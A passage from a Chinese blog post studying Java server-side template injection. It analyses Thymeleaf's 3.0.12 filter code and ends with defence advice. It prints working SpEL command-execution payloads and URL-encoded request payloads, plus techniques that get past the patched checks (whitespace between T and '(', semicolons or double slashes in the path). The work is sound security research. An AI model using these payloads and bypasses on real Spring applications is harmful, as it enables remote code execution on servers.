+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/exporessionText.png" class="">
+
+<p>继续往下走，到了 <code>expression.execute()</code>，也就是命令执行的地方，语句就变成了</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/expressionExecute.png" class="">
+
+<blockquote>
+<p>至此分析过程结束。</p>
+</blockquote>
+<h3 id="Thymeleaf-SSTI-Bypass"><a href="#Thymeleaf-SSTI-Bypass" class="headerlink" title="Thymeleaf SSTI Bypass"></a>Thymeleaf SSTI Bypass</h3><p>以下内容大多数摘自 <a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p>
+<p>在正常攻击，毫无防护的时候，我们的 PoC 是这样的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"touch executed"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x
+
+__$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>以 <code>__xxx__</code> 作为 PoC 主要部分，以 <code>::</code> 结尾</p>
+<p>针对上文中的 SSSTI 漏洞，Thymeleaf 实际上做了修复</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/Thymeleaf3012.png" class="">
+
+<h4 id="传参检测与绕过"><a href="#传参检测与绕过" class="headerlink" title="传参检测与绕过"></a>传参检测与绕过</h4><p>先说 payload</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token operator">?</span>lang<span class="token operator">=</span>__$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token operator">%</span><span class="token function">20</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>id<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在 <strong>3.0.12</strong> 版本，Thymeleaf 在 <code>util</code>目录下增加了一个名为<code>SpringStandardExpressionUtils.java</code>的文件：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/3012Fix.png" class="">
+
+<p>在该文件中，就有说明：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/UtilsFix.png" class="">
+
+<p>当调用表达式的时候，会经过该函数的判断：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/judge.png" class="">
+
+<p>来看看该函数，可以看到其主要逻辑是首先 倒序检测是否包含 <code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsSpELInstantiationOrStatic</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token keyword">final</span> <span class="token keyword">int</span> explen <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> n <span class="token operator">=</span> explen<span class="token punctuation">;</span>
+        <span class="token keyword">int</span> ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// index for computing position in the NEW_ARRAY</span>
+        <span class="token keyword">int</span> si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+        <span class="token keyword">char</span> c<span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+            c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">&lt;</span> NEW_LEN
+                    <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> NEW_ARRAY<span class="token punctuation">[</span>ni<span class="token punctuation">]</span>
+                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> explen<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                ni<span class="token operator">++</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">==</span> NEW_LEN <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// we found an object instantiation</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                n <span class="token operator">+=</span> ni<span class="token punctuation">;</span>
+                ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token comment">// This has to be restarted too</span>
+                    si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">')'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                si <span class="token operator">=</span> n<span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token char">'('</span>
+                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'T'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因此要绕过这个函数，只要满足三点：<br>1、表达式中不能含有关键字 <code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p>
+<p>三梦师傅给出的答案是 %20(空格)，在 panda 师傅研究中发现其实还有 %0a(换行)、%09(制表符)，此外，通过 fuzzing 同样可以找到很多可以利用的字符</p>
+<h4 id="url-路径的-Thymeleaf-SSTI-攻防"><a href="#url-路径的-Thymeleaf-SSTI-攻防" class="headerlink" title="url 路径的 Thymeleaf SSTI 攻防"></a>url 路径的 Thymeleaf SSTI 攻防</h4><p>对于 url 路径的 Thymeleaf，其实就是这一个接口</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/doc/&#123;document&#125;"</span><span class="token punctuation">)</span>  
+<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getDocument</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token class-name">String</span> document<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+    log<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Retrieving "</span> <span class="token operator">+</span> document<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token comment">//returns void, so view name is taken from URI  </span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>在 Thymeleaf 3.0.12 版本当中对这一漏洞也进行了修复。</li>
+</ul>
+<p>实际上在 3.0.12 版本，除了加了<code>SpringStandardExpressionUtils.java</code>，同样还增加了 <code>SpringRequestUtils.java</code>文件：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SpringRequestUtils.png" class="">
+
+<blockquote>
+<p>如果视图名称包含在 URL 的路径或参数中，请避免将视图名称作为片段表达式执行</p>
+</blockquote>
+<p>意思就是如果视图的名字和 path 一致，那么就会经过 <code>SpringRequestUtils.java</code> 中的 <code>checkViewNameNotInRequest</code> 函数检测：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SpringRequestUtilsCheckViewName.png" class="">
+
+<p>可以看到，如果 <code>requestURI</code> 不为空，并且不包含 <code>vn</code> 的值，即可进入判断，从而经过 <code>checkViewNameNotInRequest</code> 的“良民”认证。</p>
+<p>首先按照上文中的 Poc：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token operator">%</span><span class="token function">20</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们可以得到 <code>vn</code> 的值为<code>doc/__$&#123;newjava.util.scanner(t(java.lang.runtime).getruntime().exec(&quot;calc&quot;).getinputstream()).next()&#125;__::</code>，并且此时我们的 found 为 true，意思就是在 vn 当中存在恶意性的字符，我们的目标是让 found 为 false，以及绕过检测。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/FoundTrueThrow.png" class="">
+
+<p>思考一下比较流行与常规的绕过方式：大小写绕过，Unicode 绕过，URL 绕过，在尝试之后都失败了。</p>
+<p>那么是不是么办法了？答案是否定的（废话，三梦师傅给出了答案）</p>
+<p>我们先看 <code>requestURI</code> 是怎么来的：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/requestURL.png" class="">
+
+<p>跟进 <code>unescapeUriPath</code> 方法，再跟进 <code>UriEscapeUtil.unescape()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/unescapeUriPath.png" class="">
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/unescape.png" class="">
+
+<p>该函数首先检测传入的字符中是否是<code>%</code>(ESCAPE_PREFIX)或者<code>+</code>，如果是，那么进行二次处理：</p>
+<ul>
+<li>将<code>+</code>转义成空格</li>
+<li>如果<code>%</code>的数量大于一，需要一次将它们全部转义</li>
+</ul>
+<p>处理完毕后，将处理后的字符串返还回</p>
+<p>如果实际不需要unescape，那么不经过处理，直接返回原始字符串对象</p>
+<p>最终，就得到了 <code>requestURI</code>，看似相当合理，既然没有特殊的地方，那么我们只需要思考，如何从正面令<code>requestURI.contains(vn)</code>为假，即令<code>requestURI</code>不等于<code>home/__$&#123;t(java.lang.runtime).getruntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</code>即可</p>
+<p>这件事本质是令两个字符串不相等，并且要满足路由条件（<code>/home/*</code>路径下）</p>
+<p>那么结论就来了</p>
+<p><strong>Bypass 技巧 1：</strong></p>
+<p>这也是三梦师傅在群里提到的</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">home<span class="token punctuation">;</span><span class="token operator">/</span>__$<span class="token punctuation">&#123;</span><span class="token function">t</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getruntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open-acalculator"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只需要在 home 的后面加上一个分号即可</p>
+<p>这是因为在 SpringBoot 中，SpringBoot 有一个功能叫做矩阵变量，默认是禁用状态：</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SpringBootSemiTrue.png" class="">
+
+<p>如果发现路径中存在分号，那么会调用 <code>removeSemicolonContent()</code> 方法来移除分号</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/remove.png" class="">
+
+<p>这样一来使得传入的字符和 <code>vn</code> 不相同，并且又满足路由条件！成功绕过 <code>checkViewNameNotInRequest</code> 的检测</p>
+<p><strong>Bypass 技巧 2：</strong></p>
+<p>这个 Bypass 是 panda 师傅分析的时候想到的，前面也提到了，我们的实际目标就是令两个字符串不相等，并且要满足路由条件（<code>/home/*</code>路径下），那么：</p>
+<p><code>home//__$&#123;t(java.lang.runtime).getRuntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</code> 和<code>home/__$&#123;t(java.lang.runtime).getRuntime().exec(&quot;open-acalculator&quot;)&#125;__::.x</code> 不相等，并且满足路由条件！完美！（原理不用解释了吧）</p>
+<h3 id="Thymeleaf-SSTI-无回显问题"><a href="#Thymeleaf-SSTI-无回显问题" class="headerlink" title="Thymeleaf SSTI 无回显问题"></a>Thymeleaf SSTI 无回显问题</h3><ul>
+<li>这一个无回显问题其实应该算是一种攻击手法了，有点坑，这里提一嘴。</li>
+</ul>
+<p>对应的接口：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span>  
+<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">return</span> <span class="token string">"user/"</span> <span class="token operator">+</span> lang <span class="token operator">+</span> <span class="token string">"/welcome"</span><span class="token punctuation">;</span> <span class="token comment">//template path is tainted  </span>
+<span class="token punctuation">&#125;</span>  
+  
+<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/fragment"</span><span class="token punctuation">)</span>  
+<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">fragment</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> section<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">return</span> <span class="token string">"welcome :: "</span> <span class="token operator">+</span> section<span class="token punctuation">;</span> <span class="token comment">//fragment is tainted  </span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>出现的场景是在片段选择器 <code>templatename::selector</code> 下。fragment 中 payload 前面有<code>::</code>,所以 payload 在 selector 位置，这里会抛异常，导致没法回显成功。而在<code>templatename</code>位置不会。</p>
+<p>只是无法回显，但依旧可以进行命令执行。</p>
+<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><p>1、配置<code>@ResponseBody</code>或者<code>@RestController</code>，经以上注解后不会进行View解析而是直接返回。<br>2、在方法参数中加上 <code>HttpServletResponse</code>参数  ，此时spring会认为已经处理了response响应而不再进行视图解析。<br>3、在返回值前面加上 “<code>redirect:</code>“——经<code>RedirectView</code>处理。</p>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>挺有意思的，但是也难，仿佛看到了当时复现 log4j2 的攻防二象性。</p>
+<h2 id="0x06-Ref"><a href="#0x06-Ref" class="headerlink" title="0x06 Ref"></a>0x06 Ref</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/16212784.html">https://www.cnblogs.com/nice0e3/p/16212784.html</a><br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1412">https://tttang.com/archive/1412</a><br><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Java OWASP SSTI 学习</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2022-11-07 11:21:10</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2022/11/07/Java-OWASP-SSTI-学习/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/11/13/PHP-GC-%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">PHP GC 回收机制学习</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/11/06/jpress-V4-2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">jpress V4.2 代码审计</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-FreeMarker-SSTI"><span class="nav-text">0x02 FreeMarker SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FreeMarker-%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="nav-text">FreeMarker 基础语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E5%80%BC"><span class="nav-text">插值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FTL-%E6%8C%87%E4%BB%A4"><span class="nav-text">FTL 指令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FreeMarker-SSTI-%E6%88%90%E5%9B%A0%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">FreeMarker SSTI 成因与攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" 